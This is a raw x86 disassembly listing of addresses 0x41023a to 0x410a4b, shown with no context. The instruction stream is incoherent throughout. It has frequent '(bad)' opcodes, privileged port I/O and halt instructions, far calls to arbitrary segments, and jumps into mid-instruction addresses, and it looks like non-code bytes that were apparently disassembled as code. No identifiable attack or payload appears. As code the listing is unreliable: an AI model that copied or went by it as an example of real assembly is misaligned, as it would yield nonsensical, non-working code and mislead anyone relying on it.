  41023a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41023b:	punpcklbw mm4,DWORD PTR [eax-0x66]
  41023f:	outs   dx,DWORD PTR ds:[esi]
  410240:	jp     0x4101ff
  410242:	lahf   
  410243:	xchg   esp,eax
  410244:	cli    
  410245:	loop   0x41027b
  410247:	mov    DWORD PTR [esi+0x63],ebx
  41024a:	stc    
  41024b:	(bad)  
  41024c:	mov    esi,0x9b0f07cb
  410251:	in     eax,dx
  410252:	lods   eax,DWORD PTR ds:[esi]
  410253:	out    0xd8,eax
  410255:	shl    DWORD PTR [ecx],1
  410257:	jp     0x410207
  410259:	cmp    BYTE PTR [eax+0x2e],dl
  41025c:	popf   
  41025d:	mov    edx,DWORD PTR [ecx-0x16]
  410260:	call   0x5fac:0xf6968e96
  410267:	jl     0x41027d
  410269:	popa   
  41026a:	repnz add esp,ecx
  41026d:	repnz add ecx,DWORD PTR [edx-0x57838c29]
  410274:	jmp    0x410259
  410276:	mov    cl,0x53
  410278:	push   eax
  410279:	hlt    
  41027a:	jge    0x410228
  41027c:	inc    ebp
  41027d:	jge    0x4102a7
  41027f:	sti    
  410280:	mov    bh,0x63
  410282:	inc    esp
  410283:	mov    BYTE PTR [edx+eax*8-0x22],cl
  410287:	imul   edi,edx,0xcabe674a
  41028d:	push   ecx
  41028e:	cmp    eax,0x4b70716a
  410293:	fst    QWORD PTR [esi-0x65]
  410296:	pop    ecx
  410297:	sbb    eax,0xf8d310b6
  41029c:	sub    ebx,DWORD PTR [esi]
  41029e:	mov    esi,0xd7444fa1
  4102a3:	sub    ch,dl
  4102a5:	test   al,dl
  4102a7:	mov    cs,WORD PTR [ecx]
  4102a9:	mov    ds:0x78d1ce16,eax
  4102ae:	iret   
  4102af:	pop    ebx
  4102b0:	xor    al,0x5e
  4102b2:	aad    0xd
  4102b4:	push   ss
  4102b5:	xlat   BYTE PTR ds:[ebx]
  4102b6:	dec    ecx
  4102b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4102b8:	je     0x410283
  4102ba:	mov    DWORD PTR [eax],0x7e1ceec8
  4102c0:	ret    
  4102c1:	jecxz  0x410323
  4102c3:	cli    
  4102c4:	sti    
  4102c5:	retf   0x5b14
  4102c8:	retf   0xaf5d
  4102cb:	inc    ebx
  4102cc:	sbb    DWORD PTR [ebp-0x20],edi
  4102cf:	xchg   ebx,eax
  4102d0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4102d1:	stc    
  4102d2:	jp     0x410352
  4102d4:	xor    eax,0x47521a43
  4102d9:	loope  0x4102ce
  4102db:	pop    es
  4102dc:	add    ecx,DWORD PTR [ecx-0x2f]
  4102df:	add    eax,0x4e9febcd
  4102e4:	scas   eax,DWORD PTR es:[edi]
  4102e5:	push   ds
  4102e6:	mov    ebp,0x4ba6644a
  4102eb:	test   BYTE PTR [edi],cl
  4102ed:	jne    0x41033d
  4102ef:	xchg   esp,eax
  4102f0:	or     bl,bl
  4102f2:	add    bl,BYTE PTR gs:0x3a86c604
  4102f9:	stos   DWORD PTR es:[edi],eax
  4102fa:	(bad)
  4102fd:	xor    eax,0xa0c6a443
  410302:	sar    DWORD PTR ds:0xff25e077,1
  410308:	mov    ?,eax
  41030a:	xchg   edi,eax
  41030b:	and    eax,0x38927c7d
  410310:	adc    al,0x2d
  410312:	mov    WORD PTR [ecx+eiz*1+0x48],ds
  410316:	adc    eax,eax
  410318:	adc    bh,BYTE PTR [ecx]
  41031a:	lahf   
  41031b:	outs   dx,BYTE PTR ds:[esi]
  41031c:	js     0x410385
  41031e:	push   esi
  41031f:	std    
  410320:	or     DWORD PTR [eax-0x45bcc18b],ecx
  410326:	cmp    dl,dh
  410328:	inc    ecx
  410329:	fnstsw WORD PTR [edi]
  41032b:	jb     0x4102e1
  41032d:	cmp    esp,DWORD PTR [ebp+0x2d58c28a]
  410333:	mov    eax,ds:0x25d37216
  410338:	lock add al,0x80
  41033b:	mov    ebx,0x257b2645
  410340:	mov    ecx,0x4b7e1a20
  410345:	mov    ds:0xf228dfdf,eax
  41034a:	lea    ecx,[ebp-0x63]
  41034d:	xchg   edx,eax
  41034e:	adc    al,0xa4
  410350:	dec    eax
  410351:	fstp   QWORD PTR [ebx+0x7374c658]
  410357:	adc    BYTE PTR [ebx-0x7f],dl
  41035a:	jne    0x410367
  41035c:	out    0xa0,eax
  41035e:	test   BYTE PTR [edi+0x19],ah
  410361:	icebp  
  410362:	fcmovbe st,st(5)
  410364:	addr16 mov ebp,0x3f671b35
  41036a:	test   BYTE PTR [edi+0xe],cl
  41036d:	pop    eax
  41036e:	test   al,0xb1
  410370:	(bad)  
  410371:	retf   
  410372:	in     al,0x9c
  410374:	pop    esp
  410375:	xlat   BYTE PTR ds:[ebx]
  410376:	popa   
  410377:	sub    ebp,edx
  410379:	or     eax,0xf0cb60ce
  41037e:	gs xor al,0x71
  410381:	jne    0x410336
  410383:	add    ebp,esp
  410385:	mov    dh,0x10
  410387:	ja     0x4103d0
  410389:	add    ebx,DWORD PTR [edx]
  41038b:	cmp    al,0x36
  41038d:	push   ebp
  41038e:	shl    DWORD PTR ds:0x3ee91ae3,0x12
  410395:	outs   dx,BYTE PTR ds:[esi]
  410396:	mov    DWORD PTR [ebp-0x34b0d328],ecx
  41039c:	dec    esp
  41039d:	mov    esp,0xce58d780
  4103a2:	loope  0x4103f4
  4103a4:	inc    esp
  4103a5:	sbb    BYTE PTR [eax+0x76d59ad5],al
  4103ab:	add    ch,BYTE PTR [esi+0xdd1eeb3]
  4103b1:	(bad)  
  4103b2:	xor    al,0xf4
  4103b4:	xchg   BYTE PTR [ecx],al
  4103b6:	addr16 push ds
  4103b8:	adc    ebx,DWORD PTR ds:0xd118d5a2
  4103be:	cmp    ch,0xe1
  4103c1:	pop    ebp
  4103c2:	xchg   ecx,eax
  4103c3:	aas    
  4103c4:	sbb    dl,BYTE PTR [edx-0x75]
  4103c7:	mov    edi,0x33e31046
  4103cc:	jle    0x41042c
  4103ce:	in     eax,dx
  4103cf:	daa    
  4103d0:	aas    
  4103d1:	jne    0x4103b0
  4103d3:	cdq    
  4103d4:	sbb    BYTE PTR [ecx+0x70d3c1a9],cl
  4103da:	jmp    0xdda9:0x9e860d2
  4103e1:	and    BYTE PTR [ecx+ecx*2+0x23fec86c],0xa9
  4103e9:	and    DWORD PTR [esi+0x49],esi
  4103ec:	ret    
  4103ed:	stc    
  4103ee:	ins    BYTE PTR es:[edi],dx
  4103ef:	fcom   QWORD PTR [edx]
  4103f1:	sbb    DWORD PTR [esi-0x2ea65f6],0x3e274248
  4103fb:	sub    eax,0x25868e36
  410400:	push   ss
  410401:	lahf   
  410402:	shl    DWORD PTR ds:0x83912791,1
  410408:	jmp    0x35e5d041
  41040d:	neg    DWORD PTR [edx+0x6]
  410410:	daa    
  410411:	imul   esp,DWORD PTR [ecx],0x6ac980ee
  410417:	fcom   QWORD PTR [ebp+ecx*4-0x24]
  41041b:	sub    BYTE PTR [ecx],cl
  41041d:	cmp    dh,BYTE PTR fs:[esp+ebx*4]
  410421:	dec    ebp
  410422:	add    DWORD PTR [esp+ebx*2],esi
  410425:	push   ebx
  410426:	rol    eax,1
  410428:	jbe    0x410444
  41042a:	leave  
  41042b:	ret    0x9d17
  41042e:	loopne 0x410401
  410430:	and    al,0xd0
  410432:	dec    ebp
  410433:	or     al,0xd8
  410435:	inc    esp
  410436:	and    BYTE PTR [ebx-0x7],bh
  410439:	sar    BYTE PTR [edx+0x26391288],cl
  41043f:	in     al,dx
  410440:	mov    DWORD PTR [edx+0x77fd02fa],eax
  410446:	or     BYTE PTR ss:[ebx+0x8],bh
  41044a:	mov    bh,0x92
  41044c:	sbb    DWORD PTR [esi+edi*2-0x3c68aaeb],eax
  410453:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410454:	cmp    BYTE PTR [edi-0x28],0x46
  410458:	xchg   ecx,eax
  410459:	xor    al,0x87
  41045b:	pop    ecx
  41045c:	xor    BYTE PTR [edi],dl
  41045e:	jns    0x4103fb
  410460:	pop    ss
  410461:	out    0x79,eax
  410463:	outs   dx,BYTE PTR ds:[esi]
  410464:	inc    ecx
  410465:	and    esp,0xb5266b3f
  41046b:	mov    al,ds:0x18fc668a
  410470:	retf   0x2c30
  410473:	iret   
  410474:	pop    edi
  410475:	daa    
  410476:	adc    al,BYTE PTR [eax-0x6a9536d3]
  41047c:	jmp    0xbc90:0x5ba36279
  410483:	adc    DWORD PTR [edi+ecx*1],esp
  410486:	dec    edi
  410487:	ins    BYTE PTR es:[edi],dx
  410488:	sub    al,0x1a
  41048a:	aad    0x6b
  41048c:	pushw  0x1a96
  410490:	mov    ebx,0xde5db446
  410495:	push   edi
  410496:	xchg   edi,edx
  410498:	cld    
  410499:	retf   0x743c
  41049c:	inc    esi
  41049d:	jmp    DWORD PTR [ebp+0x8dcfe72]
  4104a3:	sbb    ah,BYTE PTR [ebp+0x46a65bbe]
  4104a9:	or     dh,BYTE PTR [esi-0x5c]
  4104ac:	and    eax,0x97a59f54
  4104b1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4104b2:	aad    0x58
  4104b4:	jns    0x410493
  4104b6:	jl     0x410504
  4104b8:	popa   
  4104b9:	or     al,0x8a
  4104bb:	pop    edi
  4104bc:	xor    al,0x99
  4104be:	push   edi
  4104bf:	loope  0x410441
  4104c1:	cld    
  4104c2:	rol    DWORD PTR [edi],cl
  4104c4:	cmp    DWORD PTR [esi],0xc16dfd62
  4104ca:	inc    esi
  4104cb:	push   edx
  4104cc:	shl    cl,0xfc
  4104cf:	jmp    0x3b64:0x67502fe6
  4104d6:	fsubr  st,st(7)
  4104d8:	adc    BYTE PTR gs:[edi],0xec
  4104dc:	inc    esi
  4104dd:	scas   al,BYTE PTR es:[edi]
  4104de:	inc    edi
  4104df:	test   edi,esp
  4104e1:	jb     0x41052a
  4104e3:	hlt    
  4104e4:	and    esp,DWORD PTR [edi+0x16ba75df]
  4104ea:	mov    ecx,0x302b19e2
  4104ef:	cmp    eax,0x15df491e
  4104f4:	dec    esi
  4104f5:	ret    
  4104f6:	add    esp,DWORD PTR [edi]
  4104f8:	leave  
  4104f9:	gs xchg edi,eax
  4104fb:	jle    0x41049a
  4104fd:	fisttp WORD PTR [eax-0xe]
  410500:	out    0xbc,al
  410502:	dec    eax
  410503:	mov    eax,DWORD PTR [ebp-0x48b481c1]
  410509:	xchg   edi,eax
  41050a:	jb     0x4104f6
  41050c:	push   ecx
  41050d:	adc    eax,0x798c5d73
  410512:	fwait
  410513:	stos   BYTE PTR es:[edi],al
  410514:	sti    
  410515:	jno    0x41053d
  410517:	lds    edi,FWORD PTR [edx-0x44]
  41051a:	add    DWORD PTR [eax],esi
  41051c:	pop    eax
  41051d:	test   eax,0xb72698ba
  410522:	sbb    eax,0xd528c56a
  410527:	(bad)  
  410529:	mov    esp,0x1766380b
  41052e:	cmp    BYTE PTR [ecx-0x77],bl
  410531:	repz repnz and DWORD PTR [ebx-0x46],0x5150d8f2
  41053a:	mov    dl,0x4e
  41053c:	push   cs
  41053d:	or     DWORD PTR [ecx+0x4e4ed13e],esi
  410543:	mov    DWORD PTR [eax-0x340f83b6],esi
  410549:	pop    ebp
  41054b:	xlat   BYTE PTR ds:[ebx]
  41054c:	xor    al,0xff
  41054e:	gs sbb eax,0xe381b72b
  410554:	ja     0x410587
  410556:	(bad)  
  410557:	(bad)  
  410558:	fwait
  410559:	push   ecx
  41055a:	loopne 0x410562
  41055c:	fcmovnb st,st(3)
  41055e:	adc    al,0x46
  410560:	inc    esi
  410561:	and    BYTE PTR [edx+0x4d1b3537],cl
  410567:	jbe    0x41053c
  410569:	push   edi
  41056a:	loop   0x4105cb
  41056c:	in     eax,0xd1
  41056e:	mov    cl,0xf0
  410570:	ja     0x4105ad
  410572:	icebp  
  410573:	daa    
  410574:	aad    0xce
  410576:	jmp    0x410577
  410578:	mov    eax,ds:0xb3ad66f0
  41057d:	(bad)  
  41057f:	pop    ebp
  410580:	mov    dl,0xee
  410582:	jno    0x410555
  410584:	arpl   di,dx
  410586:	mov    BYTE PTR [esi-0x5e7df566],dh
  41058c:	loop   0x41053e
  41058e:	add    cl,BYTE PTR [ecx]
  410590:	cmp    eax,0x1a29fddc
  410595:	push   esp
  410596:	inc    edi
  410597:	push   0xffffff92
  410599:	ret    0xf459
  41059c:	pop    es
  41059d:	or     edi,esi
  41059f:	xchg   edi,eax
  4105a0:	pusha  
  4105a1:	pop    ebx
  4105a2:	adc    al,0xc4
  4105a4:	inc    ebx
  4105a5:	jmp    DWORD PTR [ebx]
  4105a7:	popf   
  4105a8:	pop    edx
  4105a9:	mov    esi,0x1c81a47c
  4105ae:	pop    eax
  4105af:	mov    ds:0xec48ab37,al
  4105b4:	(bad)  
  4105b5:	lock pop es
  4105b7:	jl     0x4105b3
  4105b9:	pop    es
  4105ba:	jns    0x410571
  4105bc:	lss    esp,FWORD PTR [esi+0x3ea6aff6]
  4105c3:	mov    dl,0xa4
  4105c5:	sbb    al,0x54
  4105c7:	out    0x60,eax
  4105c9:	sub    esi,DWORD PTR [edi]
  4105cb:	je     0x41060a
  4105cd:	ja     0x4105ae
  4105cf:	pop    edx
  4105d0:	xor    BYTE PTR [esi*4-0x544e05e2],dh
  4105d7:	loope  0x4105d1
  4105d9:	in     al,0xee
  4105db:	push   edi
  4105dc:	inc    ecx
  4105dd:	mov    ebp,0x5caa1d2d
  4105e2:	push   0x67
  4105e4:	imul   BYTE PTR [eax]
  4105e6:	iret   
  4105e7:	push   es
  4105e8:	mov    edx,0x58b44ac7
  4105ed:	scas   al,BYTE PTR es:[edi]
  4105ee:	and    edx,DWORD PTR [edi+0x68]
  4105f1:	mov    edi,0xcc300e12
  4105f6:	retf   0x8d76
  4105f9:	mov    al,0x38
  4105fb:	daa    
  4105fc:	out    dx,al
  4105fd:	inc    edx
  4105fe:	sub    BYTE PTR [ecx],bh
  410600:	dec    bp
  410602:	pushf  
  410603:	jge    0x4105f1
  410605:	dec    ebx
  410606:	ja     0x41061e
  410608:	xchg   edx,eax
  410609:	sbb    eax,0x1460364d
  41060e:	aas    
  41060f:	sbb    DWORD PTR [edx+0x4c],ecx
  410612:	jg     0x4105c4
  410614:	enter  0xd91d,0xa0
  410618:	sbb    eax,0xa9f5cd26
  41061d:	lock sub eax,0xa747abb8
  410623:	mov    ebx,0x2884c387
  410628:	mov    al,0xad
  41062a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41062b:	mov    DWORD PTR [ebx+edx*8],edi
  41062e:	iret   
  41062f:	outs   dx,BYTE PTR ds:[esi]
  410630:	stos   BYTE PTR es:[edi],al
  410631:	icebp  
  410632:	jb     0x4106a2
  410634:	call   0x9c1f:0x6d6f45fc
  41063b:	scas   al,BYTE PTR es:[edi]
  41063c:	sub    al,0xa3
  41063e:	sub    eax,esi
  410640:	retf   
  410641:	(bad)  
  410642:	mov    dh,0x1d
  410644:	(bad)  
  410645:	sbb    al,0xcb
  410647:	add    edx,DWORD PTR [esi+0x7c2fd2ae]
  41064d:	aas    
  41064e:	xchg   ecx,eax
  41064f:	sub    DWORD PTR ds:0xf987eab0,0xa8e6fa72
  410659:	adc    DWORD PTR [esi*4-0x1daf82fe],esi
  410660:	mov    bh,0x7e
  410662:	fsub   QWORD PTR [ebp-0x7b]
  410665:	or     esi,DWORD PTR [edx-0x43]
  410668:	jecxz  0x410614
  41066a:	mov    eax,0x71d4d084
  41066f:	into   
  410670:	rol    dh,cl
  410672:	sahf   
  410673:	inc    edx
  410674:	cld    
  410675:	bound  eax,QWORD PTR [edx+0x7a45c365]
  41067b:	loope  0x410681
  41067d:	adc    eax,0x17e85ce3
  410682:	mov    ebp,0x8b212a1d
  410687:	dec    ecx
  410688:	mov    ebx,0x40293859
  41068d:	mov    ds:0xcde54f75,eax
  410692:	pop    DWORD PTR [edx+eiz*2+0x64996814]
  410699:	mov    esp,0x92294b99
  41069e:	cmc    
  41069f:	sbb    esi,esp
  4106a1:	or     al,0x1f
  4106a3:	stc    
  4106a4:	call   0x818c:0x940f43c6
  4106ab:	je     0x410710
  4106ad:	push   ebx
  4106af:	sbb    edi,DWORD PTR [ecx]
  4106b1:	jne    0x410671
  4106b3:	into   
  4106b4:	mov    DWORD PTR [ecx-0x6e],ebx
  4106b7:	or     BYTE PTR [eax+0x43],dl
  4106ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4106bb:	data16 fs daa 
  4106be:	mov    ds:0x2efcdfd5,al
  4106c3:	call   0xca40:0x4e6fba17
  4106ca:	nop
  4106cb:	dec    eax
  4106cc:	imul   bh
  4106ce:	pop    esp
  4106cf:	push   ecx
  4106d0:	xchg   esi,eax
  4106d1:	mov    ds:0x1d59b10d,al
  4106d6:	push   edx
  4106d7:	pop    ebx
  4106d8:	in     al,0x2
  4106da:	and    ebp,DWORD PTR [edx-0x38fe3aac]
  4106e0:	icebp  
  4106e1:	push   ds
  4106e2:	aam    0x7e
  4106e4:	add    BYTE PTR [ebx+0x37c17e6f],al
  4106ea:	jae    0x410708
  4106ec:	popa   
  4106ed:	jl     0x410693
  4106ef:	push   cs
  4106f0:	jns    0x41067e
  4106f2:	push   esp
  4106f3:	cld    
  4106f4:	mov    ebp,0xd529099a
  4106f9:	aam    0xf4
  4106fb:	and    cl,BYTE PTR ds:0x4a2ef5d1
  410701:	fsubr  QWORD PTR [ebx]
  410703:	scas   al,BYTE PTR es:[edi]
  410704:	xchg   esp,eax
  410705:	cmp    eax,0xbdd528c3
  41070a:	imul   eax,DWORD PTR [edx-0x51],0xffffff98
  41070e:	(bad)  
  41070f:	push   ebp
  410710:	cmp    al,0xc8
  410712:	aaa    
  410713:	call   0x2a2092cb
  410718:	loopne 0x41070c
  41071a:	adc    DWORD PTR [edx-0x45073bf9],0x7b
  410721:	ror    esi,0x35
  410724:	daa    
  410725:	xchg   edx,eax
  410726:	adc    eax,0x7afb6f18
  41072b:	adc    bh,ah
  41072d:	mov    edi,DWORD PTR [eax-0x73cdb971]
  410733:	jmp    0x4106e8
  410735:	mov    ebp,0x3f3e4ea5
  41073a:	mov    ebx,0x60504aed
  41073f:	sbb    eax,DWORD PTR [ecx]
  410741:	xor    al,0x22
  410743:	add    bl,ch
  410745:	pop    esp
  410746:	data16 or dh,BYTE PTR [ecx]
  410749:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41074a:	xor    ah,cl
  41074c:	or     al,0xf2
  41074e:	sbb    eax,0xb19c7496
  410753:	and    BYTE PTR [esi-0xdf6404d],bh
  410759:	pop    ss
  41075a:	movaps xmm5,xmm4
  41075d:	or     al,0x46
  41075f:	jmp    DWORD PTR [ecx]
  410761:	push   esi
  410762:	repnz mov edi,DWORD PTR [esi+0x1ff60957]
  410769:	sbb    bh,BYTE PTR [ebp+0x3a]
  41076c:	mov    ebp,0x68f1982
  410771:	(bad)  
  410772:	and    DWORD PTR es:[ebp-0x1e],0xd6a4a043
  41077a:	ins    DWORD PTR es:[edi],dx
  41077b:	pop    ds
  41077c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41077d:	xchg   edi,eax
  41077e:	je     0x410753
  410780:	jae    0x41078f
  410782:	adc    al,0x5c
  410784:	pusha  
  410785:	arpl   WORD PTR [edi+0x23],si
  410788:	push   cs
  410789:	inc    eax
  41078a:	rcl    BYTE PTR [di+0x2126],cl
  41078f:	jmp    0x20b8908f
  410794:	adc    dh,BYTE PTR [ebx+0x5dae4f87]
  41079a:	fsubr  QWORD PTR [edx+0x2a6453ec]
  4107a0:	adc    DWORD PTR [ebx+0x74],edi
  4107a3:	push   0x5c
  4107a5:	iret   
  4107a6:	je     0x4107f4
  4107a8:	pop    es
  4107a9:	xchg   ebp,eax
  4107aa:	inc    esp
  4107ab:	push   eax
  4107ac:	arpl   WORD PTR [edi+0x6f18f60f],di
  4107b2:	test   DWORD PTR [ebx+0x2b9a0174],0x7d8fb525
  4107bc:	fwait
  4107bd:	ss push cs
  4107bf:	or     DWORD PTR [ebx+0x60],esi
  4107c2:	les    eax,FWORD PTR [edi-0x4b]
  4107c5:	pop    edx
  4107c6:	push   esi
  4107c7:	icebp  
  4107c8:	xchg   edx,ecx
  4107ca:	or     al,0x1b
  4107cc:	imul   ecx,DWORD PTR [esi+0x19],0xffffff94
  4107d0:	add    eax,DWORD PTR [edx+0x4e512a00]
  4107d6:	push   ecx
  4107d7:	cmp    DWORD PTR [ebx-0x53],edi
  4107da:	repnz add edx,DWORD PTR [edx]
  4107dd:	ds or  al,0xf
  4107e0:	stos   DWORD PTR es:[edi],eax
  4107e1:	cmp    eax,0x76c79c0b
  4107e6:	jmp    0xa4c751ea
  4107eb:	mov    BYTE PTR [esp+ebx*4-0x74],ah
  4107ef:	push   eax
  4107f0:	ds inc ebx
  4107f2:	int3   
  4107f3:	sub    DWORD PTR [edx-0x5f],ebp
  4107f6:	mov    esi,0x8b4948a9
  4107fb:	adc    eax,0x93fba4f9
  410800:	ror    BYTE PTR [esi],cl
  410802:	jle    0x4107a2
  410804:	pop    edx
  410805:	fcmovnu st,st(1)
  410807:	add    al,0xda
  410809:	sub    ch,dl
  41080b:	or     eax,DWORD PTR [edi]
  41080d:	inc    edi
  41080e:	fldenv [edx+edi*1+0x184643b]
  410815:	sub    dl,dh
  410817:	pop    ecx
  410818:	call   0xa5536baf
  41081d:	and    cl,dl
  41081f:	rcr    DWORD PTR [edi+0x7298dabd],0x4a
  410826:	jbe    0x4107ff
  410828:	(bad)  [eax-0x36]
  41082b:	cs ja  0x4107c0
  41082e:	xchg   edi,eax
  41082f:	les    edi,FWORD PTR [ecx-0x28]
  410832:	jge    0x41088d
  410834:	mov    eax,ds:0x63030451
  410839:	or     dl,ch
  41083b:	mov    ch,0xaf
  41083d:	xchg   edx,eax
  41083e:	inc    ecx
  41083f:	outs   dx,BYTE PTR ds:[esi]
  410840:	push   edi
  410841:	(bad)  
  410842:	cs mov DWORD PTR fs:[ebp+0x7a],esi
  410847:	icebp  
  410848:	aaa    
  410849:	mov    esp,ebp
  41084b:	and    dh,ch
  41084d:	add    DWORD PTR [edi+0xa],edx
  410850:	jp     0x410840
  410852:	(bad)  
  410853:	sub    DWORD PTR [esi+0x76],edx
  410856:	xchg   edx,eax
  410857:	and    BYTE PTR [ecx+0x67],0xdd
  41085b:	out    0xe7,al
  41085d:	mov    ebp,?
  41085f:	enter  0xeb30,0x20
  410863:	stos   BYTE PTR es:[edi],al
  410864:	rol    DWORD PTR [ebx+ebp*8],1
  410867:	pop    es
  410868:	inc    eax
  410869:	pop    eax
  41086a:	xchg   edi,eax
  41086b:	sbb    eax,0x3c58c358
  410870:	das    
  410871:	outs   dx,DWORD PTR ds:[esi]
  410872:	outs   dx,DWORD PTR ds:[esi]
  410873:	rol    ah,0xb2
  410876:	mov    eax,0x442d1407
  41087b:	xchg   esi,eax
  41087c:	out    dx,eax
  41087d:	fucomi st,st(7)
  41087f:	dec    edi
  410880:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410881:	nop
  410882:	xchg   DWORD PTR ds:0xc244cf70,ebp
  410888:	xchg   BYTE PTR [eax],dl
  41088a:	in     al,dx
  41088b:	jbe    0x410830
  41088d:	xor    eax,0x9f57b886
  410892:	(bad)  
  410893:	and    DWORD PTR ds:0x86d700f3,esp
  410899:	test   eax,0xbd5bc060
  41089e:	(bad)  
  41089f:	out    0x5e,al
  4108a1:	xchg   edi,eax
  4108a2:	push   ss
  4108a3:	xor    eax,0x52ddf718
  4108a8:	cwde   
  4108a9:	hlt    
  4108aa:	rol    BYTE PTR [ecx],0xaa
  4108ad:	fs clc 
  4108af:	fwait
  4108b0:	mov    eax,0x7b13f0c9
  4108b5:	inc    esp
  4108b6:	dec    eax
  4108b7:	sbb    BYTE PTR [esp+ecx*2+0x34e1ec61],0xe4
  4108bf:	jne    0x410935
  4108c1:	std    
  4108c2:	xchg   ebp,eax
  4108c3:	out    0x65,eax
  4108c5:	cmp    ah,dl
  4108c7:	jg     0x4108e7
  4108c9:	bound  ebp,QWORD PTR [eax]
  4108cb:	fmul   QWORD PTR [ebp-0x54]
  4108ce:	pop    ebp
  4108cf:	cwde   
  4108d0:	scas   eax,DWORD PTR es:[edi]
  4108d1:	aas    
  4108d2:	inc    edi
  4108d3:	lds    edx,FWORD PTR [ebp-0x46]
  4108d6:	dec    ecx
  4108d7:	cmc    
  4108d8:	pop    esi
  4108d9:	inc    edi
  4108da:	loop   0x4108c7
  4108dc:	or     DWORD PTR ds:0xda3eaf71,ebp
  4108e2:	loope  0x4108bd
  4108e4:	pushf  
  4108e5:	imul   BYTE PTR [eax+0x7e594227]
  4108eb:	and    cl,BYTE PTR [ebp+0x2a3fe4b9]
  4108f1:	pop    ds
  4108f2:	stos   DWORD PTR es:[edi],eax
  4108f3:	leave  
  4108f4:	mov    es,WORD PTR [esi]
  4108f6:	mov    dl,0xa8
  4108f8:	and    BYTE PTR ds:0xa1d57a4a,ah
  4108fe:	inc    edx
  4108ff:	xchg   edi,eax
  410900:	int3   
  410901:	adc    DWORD PTR [edi+0x3a],esi
  410904:	dec    ebp
  410905:	jge    0x4108b5
  410907:	sub    DWORD PTR [edx],ebx
  410909:	je     0x410984
  41090b:	sbb    eax,0xeb9879df
  410910:	rcr    ah,cl
  410912:	push   edi
  410913:	sub    DWORD PTR [ecx],0xb75ff387
  410919:	fmul   DWORD PTR [edi]
  41091b:	dec    ebp
  41091c:	cmp    al,0x53
  41091e:	stos   DWORD PTR es:[edi],eax
  41091f:	mov    cl,0xb
  410921:	mov    ds:0xe9c7e415,al
  410926:	xchg   esi,eax
  410927:	mov    esi,0xa581c22c
  41092c:	out    dx,eax
  41092d:	(bad)  
  41092e:	pop    esp
  41092f:	add    DWORD PTR [eax],0x1cfcc02
  410935:	push   0x4e
  410937:	mov    eax,0xb78c8393
  41093c:	fistp  WORD PTR [eax-0x3df2148a]
  410942:	pop    edi
  410943:	sahf   
  410944:	cs or  ch,cl
  410947:	bsf    edx,DWORD PTR [edx-0x452cc884]
  41094e:	stc    
  41094f:	call   0xbefc:0x95bf865c
  410956:	mov    DWORD PTR [edx],edi
  410958:	into   
  410959:	jmp    0xebeee51b
  41095e:	push   eax
  41095f:	add    al,0x1b
  410961:	jae    0x41090c
  410963:	dec    ecx
  410964:	enter  0xc590,0x3
  410968:	frstor [ebx-0x38f4c48c]
  41096e:	pop    edi
  41096f:	(bad)  
  410970:	push   esi
  410971:	int3   
  410972:	call   0xbe24bbb1
  410977:	push   edi
  410978:	sti    
  410979:	js     0x41096f
  41097b:	adc    edi,DWORD PTR [esi-0x48]
  41097e:	cmp    al,0x2e
  410980:	or     al,BYTE PTR [edi-0x36fdd3eb]
  410986:	pop    edx
  410987:	out    dx,eax
  410988:	cmp    eax,0x526cafbf
  41098d:	xchg   ebp,eax
  41098e:	jns    0x41094a
  410990:	not    bh
  410992:	lds    edi,FWORD PTR [edx+0x381d3c04]
  410998:	and    ebx,DWORD PTR [edi+0x1768f79e]
  41099e:	int    0x7d
  4109a0:	aas    
  4109a1:	jp     0x410982
  4109a3:	pop    ds
  4109a4:	sub    DWORD PTR [ecx],ecx
  4109a6:	idiv   DWORD PTR [eax+0x6c]
  4109a9:	aam    0x89
  4109ab:	xchg   ebp,eax
  4109ac:	mov    dh,0xc0
  4109ae:	out    0x75,eax
  4109b0:	mov    ecx,0xeda5d80e
  4109b5:	lahf   
  4109b6:	xchg   ecx,eax
  4109b7:	cmp    ebx,eax
  4109b9:	std    
  4109ba:	gs inc esi
  4109bc:	pop    ss
  4109bd:	cmp    ebp,DWORD PTR [ebx+ebp*2]
  4109c0:	and    eax,0xb055195
  4109c5:	add    edi,DWORD PTR [edx-0x5d]
  4109c8:	mov    ds:0x3df11baf,eax
  4109cd:	inc    esp
  4109ce:	test   eax,0x6b5e0c9a
  4109d3:	xor    BYTE PTR [edx-0x1f340094],ch
  4109d9:	(bad)  
  4109da:	fs pop ebx
  4109dc:	adc    al,0xed
  4109de:	(bad)  
  4109e0:	les    eax,FWORD PTR ds:0x2cfada4
  4109e6:	sub    BYTE PTR [edi+ecx*1],al
  4109e9:	mov    bh,BYTE PTR [ecx-0x73a3d238]
  4109ef:	jnp    0x410a6e
  4109f1:	mov    ds:0x23f47807,al
  4109f6:	jne    0x410a5d
  4109f8:	and    eax,0x50711a48
  4109fd:	sbb    eax,0x65ed1b3a
  410a02:	sub    eax,DWORD PTR [ebp+0x15]
  410a05:	pop    ebp
  410a06:	adc    BYTE PTR [esi+0x30],ch
  410a09:	stos   DWORD PTR es:[edi],eax
  410a0a:	mov    DWORD PTR [ecx-0x34],0x3afa59d6
  410a11:	ins    BYTE PTR es:[edi],dx
  410a12:	dec    eax
  410a13:	mov    ah,0x85
  410a15:	pop    esp
  410a16:	scas   al,BYTE PTR es:[edi]
  410a17:	sub    al,0xb
  410a19:	aam    0x5b
  410a1b:	mov    ebx,0x68f8a5a7
  410a20:	scas   eax,DWORD PTR es:[edi]
  410a21:	mov    bl,BYTE PTR [edi]
  410a23:	mov    edi,DWORD PTR [ebx-0x7d]
  410a26:	fstp   TBYTE PTR [ebx+ebx*8-0xda7dffd]
  410a2d:	push   edi
  410a2e:	pop    esi
  410a2f:	xchg   esi,eax
  410a30:	inc    ebp
  410a31:	loop   0x4109ce
  410a33:	pop    esp
  410a34:	loope  0x410a82
  410a36:	popa   
  410a37:	loopne 0x4109f0
  410a39:	adc    al,0xf7
  410a3b:	fs mov dh,0xe2
  410a3e:	and    al,0x6b
  410a40:	sub    eax,0xc7ce046a
  410a45:	adc    DWORD PTR [eax],0x2a86a51c
  410a4b:	push   0x66f1b925
